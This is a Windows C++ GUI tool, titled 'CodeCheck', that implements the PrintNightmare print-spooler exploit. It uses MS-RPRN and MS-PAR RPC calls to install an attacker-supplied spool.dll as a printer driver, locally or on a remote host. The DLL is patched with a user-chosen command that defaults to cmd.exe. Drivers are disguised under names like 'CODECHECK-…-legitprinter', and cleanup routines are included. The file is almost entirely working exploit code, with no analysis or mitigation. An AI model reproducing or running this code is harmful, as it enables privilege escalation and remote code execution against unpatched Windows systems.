// CodeCheck.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "CodeCheck.h"



// Global Variables:
HINSTANCE	hInst;								// current instance
HWND		ghWnd;
HWND		ghwndE;
HFONT		ghFont;
int			gWordsWritten, gOldBufSize;

WCHAR g_pszRemote[256];
WCHAR g_szcmd[256];
WCHAR g_szPrefix[256];

TCHAR szTitle[] = L"CodeCheck";					// The title bar text
TCHAR szWindowClass[] = L"CODECHECK";			// the main window class name
TCHAR gwcbuf[256], *gMem;


// Forward declarations of functions included in this code module:

void AddString(LPWSTR str) {
	int i = 0;
	while (true) {
		if (str[i] == 0) { break; }
		i++;
	}
	i += 3;
	i *= 2;
	WORD* m = (WORD*)LocalAlloc(LPTR, i);
	i = 0;
	while (str[i] != 0) {
		*(WORD*)&m[i] = str[i];
		i++;
	}
	*(DWORD*)&m[i] = 0x000A000D;
	i = GetWindowTextLength(ghwndE);
	SendMessage(ghwndE, EM_SETSEL, i, i);
	SendMessage(ghwndE, EM_REPLACESEL, 0, (LPARAM)m);
	LocalFree((HLOCAL)m);
}


void printfEx(LPWSTR text, int error) {

	if (error != 0) {
		HLOCAL hl = LocalAlloc(LPTR, (lstrlen(text) + 1 + 16) * 2);
		wsprintf((LPWSTR)hl, L"%s0x%08X", text, error);
		AddString((LPWSTR)hl);
		LocalFree(hl);
	}
	else {
		AddString((LPWSTR)text);
	}
}


/*PRINTNIGHTMARE*/
extern "C" {
	EXCEPTION_DISPOSITION
		__C_specific_handler(
			struct _EXCEPTION_RECORD* ExceptionRecord,
			void* EstablisherFrame,
			struct _CONTEXT* ContextRecord,
			struct _DISPATCHER_CONTEXT* DispatcherContext)
	{
		typedef EXCEPTION_DISPOSITION Function(struct _EXCEPTION_RECORD*, void*, struct _CONTEXT*, _DISPATCHER_CONTEXT*);
		static Function* FunctionPtr;

		if (!FunctionPtr)
		{
			HMODULE Library = LoadLibraryA("msvcrt.dll");
			FunctionPtr = (Function*)GetProcAddress(Library, "__C_specific_handler");
		}

		return FunctionPtr(ExceptionRecord, EstablisherFrame, ContextRecord, DispatcherContext);
	}
}


DWORD g_id = 0xCCCCCCCC;
LPCWSTR get_lib_path(BOOLEAN bIsPar) {
	int cb;
	LPWSTR pbuf = 0;
	BYTE* b;

	b = (BYTE*)LocalAlloc(LPTR, 2048);
	if (b != 0) {
		cb = lstrlen(g_szPrefix);
		pbuf = (LPWSTR)LocalAlloc(LPTR, ((MAX_PATH + 1) * 2) + ((cb + 1) * 2));
		if (pbuf != 0) {
			cb = GetCurrentDirectory(MAX_PATH, pbuf);
			wsprintf((pbuf + cb), (LPCWSTR)L"\\%s", L"spool.dll");
			HANDLE hFile = CreateFile(pbuf, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
			if (hFile == INVALID_HANDLE_VALUE) {
				LocalFree((HLOCAL)pbuf);
				pbuf = 0;
			}
			else {
				ReadFile(hFile, b, 0x640, (LPDWORD)&cb, NULL);
				DWORD* pd;
				pd = (DWORD*)(b + 0x430);
				DWORD d1 = *(pd + 0);
				DWORD d2 = *(pd + 1);
				DWORD d3 = *(pd + 2);
				DWORD d4 = *(pd + 3);
				if (d1 == g_id && d2 == g_id && d3 == g_id && d4 == g_id) {
					if (lstrlen((LPWSTR)(&g_szcmd)) > 0) {
						lstrcpy((LPWSTR)(pd + 4), g_szcmd);
					}
					else {
						lstrcpy((LPWSTR)(pd + 4), L"cmd.exe");
					}

					SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
					WriteFile(hFile, b, cb, (LPDWORD)&cb, NULL);
				}
				else {
					LocalFree((HLOCAL)pbuf);
					pbuf = 0;
				}
				CloseHandle(hFile);
			}
		}
		if (bIsPar && pbuf != 0) {
			cb = lstrlen(g_szPrefix);
			if (cb > 0) {
				WCHAR* p = pbuf + lstrlen(pbuf);
				for (; p >= (pbuf + 2); p--) {
					*(p + cb - 2) = *p;
				}
				cb--;
				for (p = pbuf + cb; ; p--, cb--) {
					if (cb < 0) { break; }
					*p = g_szPrefix[cb];
				}
			}
		}
		LocalFree(b);
	}
	return pbuf;
}

PWSTR string_getRandomGUID()
{
	UNICODE_STRING uString;
	GUID guid;
	PWSTR buffer = NULL;
	if (NT_SUCCESS(UuidCreate(&guid)))
	{
		if (NT_SUCCESS(RtlStringFromGUID(&guid, &uString)))
		{
			if (buffer = (PWSTR)LocalAlloc(LPTR, (uString.MaximumLength + 2))) {
				lstrcpyn(buffer, uString.Buffer, (uString.MaximumLength / 2));
			}
			RtlFreeUnicodeString(&uString);
		}
	}
	return buffer;
}

/*
BOOL printnightmare_normalize_library(BOOL bIsPar, LPCWSTR szLibrary, LPWSTR* pszNormalizedLibrary, LPWSTR* pszShortLibrary)
{
	BOOL status = FALSE;
	LPCWSTR szPtr;

	szPtr = wcsstr(szLibrary, L"\\\\");
	if (szPtr != szLibrary)
	{
		szPtr = wcsstr(szLibrary, L"//");
	}

	if (szPtr == szLibrary)
	{
		status = kull_m_string_sprintf(pszNormalizedLibrary, L"\\??\\UNC\\%s", szLibrary + 2);
	}
	else
	{
		if (!bIsPar)
		{
			status = kull_m_file_getAbsolutePathOf(szLibrary, pszNormalizedLibrary);
		}
		else
		{
			status = kull_m_string_copy(pszNormalizedLibrary, szLibrary);
		}
	}

	if (status)
	{
		if (pszShortLibrary)
		{
			status = FALSE;
			*pszShortLibrary = wcsrchr(*pszNormalizedLibrary, L'\\');
			if (*pszShortLibrary && *(*pszShortLibrary + 1))
			{
				(*pszShortLibrary)++;
				status = TRUE;
			}
			else
			{
				PRINT_ERROR(L"Unable to get short library name from library path (%s)\n", *pszNormalizedLibrary);
				LocalFree(*pszNormalizedLibrary);
			}
		}
	}
	else PRINT_ERROR_AUTO(L"kull_m_string_sprintf/kull_m_string_copy");

	return status;
}
*/

BOOL rpc_createBinding(LPCWSTR uuid, LPCWSTR ProtSeq, LPCWSTR NetworkAddr, LPCWSTR Endpoint, LPCWSTR Service, BOOL addServiceToNetworkAddr, DWORD AuthnSvc, RPC_AUTH_IDENTITY_HANDLE hAuth, DWORD ImpersonationType, RPC_BINDING_HANDLE* hBinding, void (RPC_ENTRY* RpcSecurityCallback)(void*))
{
	BOOL status = FALSE;
	RPC_STATUS rpcStatus;
	RPC_WSTR StringBinding = NULL;
	RPC_SECURITY_QOS SecurityQOS = { RPC_C_SECURITY_QOS_VERSION, RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH | (ImpersonationType == RPC_C_IMP_LEVEL_DELEGATE) ? RPC_C_QOS_CAPABILITIES_IGNORE_DELEGATE_FAILURE : (unsigned long)0 , RPC_C_QOS_IDENTITY_STATIC, ImpersonationType };
	LPWSTR fullServer = NULL;

	*hBinding = NULL;
	rpcStatus = RpcStringBindingCompose((RPC_WSTR)uuid, (RPC_WSTR)ProtSeq, (RPC_WSTR)NetworkAddr, (RPC_WSTR)Endpoint, NULL, &StringBinding);
	if (rpcStatus == RPC_S_OK) {
		rpcStatus = RpcBindingFromStringBinding(StringBinding, hBinding);
		if (rpcStatus == RPC_S_OK) {
			if (*hBinding) {
				if (AuthnSvc != RPC_C_AUTHN_NONE) {
					if (addServiceToNetworkAddr) {
						if (Service && NetworkAddr) {
							fullServer = (LPWSTR)LocalAlloc(LPTR, (lstrlen(Service) + lstrlen(NetworkAddr) + 8));
							wsprintf(fullServer, L"%s/%s", Service, NetworkAddr);
						}
						else {
							printfEx(L"Cannot add Service to NetworkAddr if NULL", 0);
						}
					}

					if (!addServiceToNetworkAddr || fullServer) {
						rpcStatus = RpcBindingSetAuthInfoEx(*hBinding, (RPC_WSTR)(fullServer ? fullServer : (Service ? Service : CODECHECK)), RPC_C_AUTHN_LEVEL_PKT_PRIVACY, AuthnSvc, hAuth, RPC_C_AUTHZ_NONE, &SecurityQOS);
						if (rpcStatus == RPC_S_OK) {
							if (RpcSecurityCallback) {
								rpcStatus = RpcBindingSetOption(*hBinding, RPC_C_OPT_SECURITY_CALLBACK, (ULONG_PTR)RpcSecurityCallback);
								status = (rpcStatus == RPC_S_OK);
								if (!status) {
									printfEx(L"RpcBindingSetOption: ", rpcStatus);
								}
							}
							else {
								status = TRUE;
							}
						}
						else {
							printfEx(L"RpcBindingSetAuthInfoEx: ", rpcStatus);
						}
					}
				}
				else {
					status = TRUE;
				}

				if (!status) {
					rpcStatus = RpcBindingFree(hBinding);
					if (rpcStatus == RPC_S_OK) {
						*hBinding = NULL;
					}
					else {
						printfEx(L"RpcBindingFree: ", rpcStatus);
					}
				}
			}
			else {
				printfEx(L"No Binding!", 0);
			}
		}
		else {
			printfEx(L"RpcBindingFromStringBinding: ", rpcStatus);
		}
		RpcStringFree(&StringBinding);
	}
	else {
		printfEx(L"RpcStringBindingCompose: ", rpcStatus);
	}

	if (fullServer){
		LocalFree(fullServer);
	}
	return status;
}

BOOL rpc_deleteBinding(RPC_BINDING_HANDLE* hBinding)
{
	BOOL status = FALSE;
	if (status = (RpcBindingFree(hBinding) == RPC_S_OK)) { *hBinding = NULL; }
	return status;
}

BOOL printnightmare_FillStructure(PDRIVER_INFO_2 pInfo2, BOOL bIsX64, BOOL bIsDynamic, LPCWSTR pszForce, BOOL bIsPar, handle_t hRemoteBinding)
{
	BOOL status = FALSE;
	LPWSTR pbuf;
	LPWSTR pszPrinterDriverDirectory = NULL;
	wchar_t szDynamicPrinterDriverDirectory[MAX_PATH + 1];
	DWORD ret, cbNeeded;

	if (pszForce)
	{
		printfEx(L"| force driver/data: ", 0);
		printfEx((LPWSTR)pszForce, 0);
		pbuf = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * 2);
		if (pbuf != 0) {
			lstrcpy(pbuf, pszForce);
			pInfo2->pDriverPath = pbuf;
			pbuf = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * 2);
			if (pbuf != 0) {
				lstrcpy(pbuf, pszForce);
				pInfo2->pDataFile = pbuf;
				status = TRUE;
			}
			else LocalFree(&pInfo2->pDriverPath);
		}
	}
	else
	{
		pszPrinterDriverDirectory = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * 2);
		if (pszPrinterDriverDirectory != 0) {
			if (!bIsDynamic)
			{
				wsprintf(pszPrinterDriverDirectory, L"C:\\Windows\\System32\\Spool\\Drivers\\%s", bIsX64 ? L"x64" : L"W32X86");
				printfEx(L"| static:", 0);
				printfEx(pszPrinterDriverDirectory, 0);
			}
			else
			{
				RpcTryExcept {
					if (bIsPar)
					{
						printfEx(L"> RpcAsyncGetPrinterDriverDirectory...", 0);
						ret = RpcAsyncGetPrinterDriverDirectory(hRemoteBinding, NULL, pInfo2->pEnvironment, 1, (unsigned char*)szDynamicPrinterDriverDirectory, sizeof(szDynamicPrinterDriverDirectory), &cbNeeded);
					}
					else
					{
						printfEx(L"> RpcGetPrinterDriverDirectory...", 0);
						ret = RpcGetPrinterDriverDirectory(NULL, pInfo2->pEnvironment, 1, (unsigned char*)szDynamicPrinterDriverDirectory, sizeof(szDynamicPrinterDriverDirectory), &cbNeeded);
					}
					if (ret == ERROR_SUCCESS)
					{
						printfEx(szDynamicPrinterDriverDirectory, 0);
						lstrcpy(pszPrinterDriverDirectory, szDynamicPrinterDriverDirectory);
					}
					else {
						if (bIsPar) { printfEx(L"RpcAsyncGetPrinterDriverDirectory: ", ret); }
						else { printfEx(L"RpcGetPrinterDriverDirectory: ", ret); }
						LocalFree(pszPrinterDriverDirectory);
						pszPrinterDriverDirectory = NULL;
					}
				}
				RpcExcept(RPC_EXCEPTION)
					LocalFree(pszPrinterDriverDirectory);
					pszPrinterDriverDirectory = NULL;
					printfEx(L"RPC Exception: ", RpcExceptionCode());
				RpcEndExcept
			}
		}

		if (pszPrinterDriverDirectory != NULL)
		{
			pbuf = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * 2);
			if (pbuf != 0) {
				wsprintf(pbuf, L"%s\\3\\%s", pszPrinterDriverDirectory, L"mxdwdrv.dll");
				pInfo2->pDriverPath = pbuf;
				pbuf = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * 2);
				if (pbuf != 0) {
					wsprintf(pbuf, L"%s\\3\\%s", pszPrinterDriverDirectory, L"mxdwdrv.dll");
					pInfo2->pDataFile = pbuf;
					status = TRUE;
				}
				else
				{
					LocalFree(pInfo2->pDriverPath);
				}
			}
			LocalFree(pszPrinterDriverDirectory);
		}
	}
	return status;
}

BOOL printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, PDRIVER_INFO_2 pInfo2, DWORD dwFlags)
{
	BOOL status = FALSE;
	DWORD ret;
	DRIVER_CONTAINER container_info;

	container_info.Level = 2;
	container_info.DriverInfo.Level2 = pInfo2;

	RpcTryExcept {
		printfEx(pInfo2->pName, 0);
		printfEx(pInfo2->pEnvironment, 0);
		printfEx(L"dwFlags: ", dwFlags);
		printfEx(pInfo2->pConfigFile, 0);
		if (bIsPar)
		{
			printfEx(L"> RpcAsyncAddPrinterDriver...", 0);
			ret = RpcAsyncAddPrinterDriver(hRemoteBinding, NULL, &container_info, dwFlags);
		}
		else
		{
			printfEx(L"> RpcAddPrinterDriverEx...", 0);
			ret = RpcAddPrinterDriverEx(NULL, &container_info, dwFlags);
		}

		if (ret == ERROR_SUCCESS)
		{
			status = TRUE;
			printfEx(L"OK!", 0);
		}
		else printfEx(L"Error: ", ret);
	}
	RpcExcept(RPC_EXCEPTION)
	printfEx(L"RPC Exception: ", RpcExceptionCode());
	RpcEndExcept

	return status;
}

BOOL printnightmare_DeletePrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, LPCWSTR pName)
{
	BOOL status = FALSE;
	DWORD ret;

	RpcTryExcept {
		if (bIsPar)
		{
			printfEx(L"> RpcAsyncDeletePrinterDriverEx...", 0);
			ret = RpcAsyncDeletePrinterDriverEx(hRemoteBinding, NULL, (wchar_t*)szEnvironment, (wchar_t*)pName, DPD_DELETE_UNUSED_FILES, 0);
		}
		else
		{
			printfEx(L"> RpcDeletePrinterDriverEx...", 0);
			ret = RpcDeletePrinterDriverEx(NULL, (wchar_t*)szEnvironment, (wchar_t*)pName, DPD_DELETE_UNUSED_FILES, 0);
		}

		if (ret == ERROR_SUCCESS)
		{
			status = TRUE;
			printfEx(L"OK!", 0);
		}
		else printfEx(L"Error: ", ret);
	}
	RpcExcept(RPC_EXCEPTION)
	printfEx(L"RPC Exception: ", RpcExceptionCode());
	RpcEndExcept

	return status;
}

BOOL printnightmare_EnumPrinters(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, _PDRIVER_INFO_2* ppDriverInfo, DWORD* pcReturned)
{
	BOOL status = FALSE;
	DWORD ret, cbNeeded = 0;

	RpcTryExcept {
		if (bIsPar)
		{
			ret = RpcAsyncEnumPrinterDrivers(hRemoteBinding, NULL, (wchar_t*)szEnvironment, 2, NULL, 0, &cbNeeded, pcReturned);
		}
		else
		{
			ret = RpcEnumPrinterDrivers(NULL, (wchar_t*)szEnvironment, 2, NULL, 0, &cbNeeded, pcReturned);
		}

		if (ret == ERROR_INSUFFICIENT_BUFFER)
		{
			*ppDriverInfo = (_PDRIVER_INFO_2)LocalAlloc(LPTR, cbNeeded);
			if (*ppDriverInfo)
			{
				if (bIsPar)
				{
					ret = RpcAsyncEnumPrinterDrivers(hRemoteBinding, NULL, (wchar_t*)szEnvironment, 2, (BYTE*)*ppDriverInfo, cbNeeded, &cbNeeded, pcReturned);
				}
				else
				{
					ret = RpcEnumPrinterDrivers(NULL, (wchar_t*)szEnvironment, 2, (BYTE*)*ppDriverInfo, cbNeeded, &cbNeeded, pcReturned);
				}

				if (ret == ERROR_SUCCESS)
				{
					status = TRUE;
				}
				else
				{
					if (bIsPar) { printfEx(L"RpcAsyncEnumPrinterDrivers(data): ", ret); }
					else { printfEx(L"RpcEnumPrinterDrivers(data): ", ret); }
					LocalFree(*ppDriverInfo);
				}
			}
		}
		else {
			if (bIsPar) { printfEx(L"RpcAsyncEnumPrinterDrivers(init): ", ret); }
			else { printfEx(L"RpcEnumPrinterDrivers(init): ", ret); }
		}
	}
	RpcExcept(RPC_EXCEPTION)
	printfEx(L"RPC Exception: ", RpcExceptionCode());
	RpcEndExcept

	return status;
}

void printnightmare_ListPrintersAndMaybeDelete(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, BOOL bIsDelete)
{
	DWORD i, j , cReturned = 0;
	_PDRIVER_INFO_2 pDriverInfo;
	PWSTR pName, pConfig;
	WCHAR buf[16];

	if (printnightmare_EnumPrinters(bIsPar, hRemoteBinding, szEnvironment, &pDriverInfo, &cReturned))
	{
		for (i = 0; i < cReturned; i++)
		{
			pName = (PWSTR)(pDriverInfo[i].NameOffset ? (PBYTE)&pDriverInfo[i] + pDriverInfo[i].NameOffset : NULL);
			pConfig = (PWSTR)(pDriverInfo[i].ConfigFileOffset ? (PBYTE)&pDriverInfo[i] + pDriverInfo[i].ConfigFileOffset : NULL);
			if (pName && pConfig)
			{
				printfEx(pName, 0);
				printfEx(pConfig, 0);
				if (bIsDelete)
				{
					for (j = 0; ; j++) {
						buf[j] = pName[j];
						if (j >= ((sizeof CODECHECK) - 2) / 2) { buf[j] = 0; break; }
						if (buf[j] == 0) { break; }
					}
					if (0 == lstrcmp(buf, CODECHECK))
					{
						printnightmare_DeletePrinterDriver(bIsPar, hRemoteBinding, szEnvironment, pName);
					}
				}
			}
		}
		LocalFree(pDriverInfo);
	}
}

void printnightmare(int aParam) {
	RPC_STATUS rpcStatus;
	BOOL bIsPar, bIsX64;
	DWORD AuthnSvc;
	LPWSTR pbuf, pszRand, pszRemote;
	LPCWSTR pszLibrary, pszProtSeq, pszEndpoint, pszService, pszForce=NULL;
	SEC_WINNT_AUTH_IDENTITY secIdentity = { NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE };
	DRIVER_INFO_2 DriverInfo = { 3, NULL, NULL, NULL, NULL, NULL, };

	RtlGetNtVersionNumbers(&_NT_MAJOR_VERSION, &_NT_MINOR_VERSION, &_NT_BUILD_NUMBER);
	_NT_BUILD_NUMBER &= 0x00007fff;

	pszRemote = NULL;
	if (lstrlen(g_pszRemote) > 0) {
		pszRemote = g_pszRemote;
	}

	if (pszRemote != NULL) {
		bIsPar = TRUE;
		pszProtSeq = L"ncacn_ip_tcp";
		pszEndpoint = NULL;
		pszService = L"host";
		AuthnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
		printfEx(L"[ms-par/ncacn_ip_tcp] remote:", 0);
		printfEx(pszRemote, 0);
	}
	else {
		bIsPar = FALSE;
		pszEndpoint = (_NT_BUILD_NUMBER < _WIN_MIN_BUILD_8) ? L"spoolss" : NULL;
		pszProtSeq = L"ncalrpc";
		pszService = NULL;
		AuthnSvc = RPC_C_AUTHN_LEVEL_DEFAULT;
		rpcStatus = RPC_S_OK;
		printfEx(L"[ms-rprn/ncalrpc] local", 0);
	}

#if defined(_M_X64) || defined(_M_ARM64) // :')
	bIsX64 = TRUE;
#elif defined(_M_IX86)
	bIsX64 = FALSE;
#endif

	if (rpc_createBinding(NULL, pszProtSeq, pszRemote, pszEndpoint, pszService, bIsPar, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DELEGATE, &hSpoolHandle, NULL)) {
	
		if (bIsPar) {
			rpcStatus = RpcBindingSetObject(hSpoolHandle, (UUID*)&PAR_ObjectUUID);
			if (rpcStatus != RPC_S_OK)
			{
				printfEx(L"RpcBindingSetObject: ", rpcStatus);
			}
		}

		if (rpcStatus == RPC_S_OK) {
			DriverInfo.pEnvironment = bIsX64 ? L"Windows x64" : L"Windows NT x86";
			pszLibrary = get_lib_path(bIsPar);
			if (pszLibrary != 0) {
				DriverInfo.pConfigFile = (LPWSTR)pszLibrary;
				pszRand = string_getRandomGUID();
				if (pszRand){
					pbuf = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * 2);
					if (pbuf != 0) {
						wsprintf(pbuf, CODECHECK L"-%s-legitprinter", pszRand);
						DriverInfo.pName = pbuf;
						if (printnightmare_FillStructure(&DriverInfo, bIsX64, TRUE, pszForce, bIsPar, hSpoolHandle))
						{
							if (printnightmare_AddPrinterDriver(bIsPar, hSpoolHandle, &DriverInfo, APD_COPY_FROM_DIRECTORY | APD_COPY_NEW_FILES | APD_INSTALL_WARNED_DRIVER))
							{
								if (!bIsPar){ // we can't remotely with normal user, use /clean with > rights
									printnightmare_DeletePrinterDriver(bIsPar, hSpoolHandle, DriverInfo.pEnvironment, DriverInfo.pName);
								}
							}

							LocalFree(DriverInfo.pDataFile);
							LocalFree(DriverInfo.pDriverPath);
						}
						LocalFree(DriverInfo.pName);
					}
					LocalFree(pszRand);
				}
				LocalFree(DriverInfo.pConfigFile);
			}
			else {
				printnightmare_ListPrintersAndMaybeDelete(bIsPar, hSpoolHandle, DriverInfo.pEnvironment, TRUE);
			}
		}
		rpc_deleteBinding(&hSpoolHandle);
	}


	ExitThread(0);
}

INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

INT_PTR CALLBACK dlgServer(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	int n;

	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:

		n = lstrlen(g_pszRemote);
		if (n > 0) {
			SendDlgItemMessage(hDlg, IDE_EDIT, WM_SETTEXT, n, (LPARAM)g_pszRemote);
		}
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK) {
			SendDlgItemMessage(hDlg, IDE_EDIT, WM_GETTEXT, 255, (LPARAM)g_pszRemote);
		}
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

INT_PTR CALLBACK dlgCmd(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	int n;

	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:

		n = lstrlen(g_szcmd);
		if (n > 0) {
			SendDlgItemMessage(hDlg, IDE_EDIT2, WM_SETTEXT, n, (LPARAM)g_szcmd);
		}
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK) {
			SendDlgItemMessage(hDlg, IDE_EDIT2, WM_GETTEXT, 255, (LPARAM)g_szcmd);
		}
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

INT_PTR CALLBACK dlgPrefix(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	int n;

	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:

		n = lstrlen(g_szPrefix);
		if (n > 0) {
			SendDlgItemMessage(hDlg, IDE_EDIT3, WM_SETTEXT, n, (LPARAM)g_szPrefix);
		}
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK) {
			SendDlgItemMessage(hDlg, IDE_EDIT3, WM_GETTEXT, 255, (LPARAM)g_szPrefix);
		}
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	case WM_COMMAND:
		wmId = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// Parse the menu selections:
		switch (wmId)
		{
		case IDM_NIGHTMARE:
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)printnightmare, 0, 0, 0);
			break;
		case IDM_SERVER:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_SERVERDLG), hWnd, dlgServer);
			break;
		case IDM_REMOTECMD:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_CMDDLG), hWnd, dlgCmd);
			break;
		case IDM_PREFIX:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_PREFIXDLG), hWnd, dlgPrefix);
			break;
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			DeleteObject(ghFont);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: Add any drawing code here...
		EndPaint(hWnd, &ps);
		break;
	case WM_SIZE:
		MoveWindow(ghwndE, 0, 0, (lParam & 0xFFFF), (HIWORD(lParam)), true);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, (LPCWSTR)IDI_ICON1);
	wcex.hIconSm = wcex.hIcon;
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = MAKEINTRESOURCE(IDM_MAIN);
	wcex.lpszClassName = szWindowClass;

	return RegisterClassEx(&wcex);
}

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	HWND hWnd;
	hInst = hInstance; // Store instance handle in our global variable


	int x = GetSystemMetrics(SM_CXSCREEN)/2;
	int y = GetSystemMetrics(SM_CYSCREEN)/2;
	hWnd = CreateWindowEx(WS_EX_LEFT | WS_EX_ACCEPTFILES, szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, x, y, NULL, NULL, hInstance, NULL);

	if (!hWnd)
	{
		return FALSE;
	}
	ghWnd = hWnd;
	ghwndE = CreateWindow(L"edit", NULL, WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_WANTRETURN | WS_VSCROLL | WS_HSCROLL | WS_BORDER, 0, 0, 0, 0, hWnd, NULL, hInstance, NULL);
	ghFont = CreateFontW(16, 6, 0, 0, 500, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, DEFAULT_PITCH, L"Arial");
	SendMessage(ghwndE, WM_SETFONT, (WPARAM)ghFont, 1);
	SendMessage(ghwndE, EM_SETLIMITTEXT, -1, 0);

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}

int xWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	UNREFERENCED_PARAMETER(hPrevInstance);

	// TODO: Place code here.
	MSG msg;
	HACCEL hAccelTable;

	MyRegisterClass(hInstance);

	// Perform application initialization:
	if (!InitInstance(hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_CODECHECK));

	// Main message loop:
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int)msg.wParam;
}

void APIENTRY xmain() {
	ExitProcess(xWinMain((HINSTANCE)GetModuleHandle(NULL), NULL, GetCommandLine(), SW_SHOW));
}


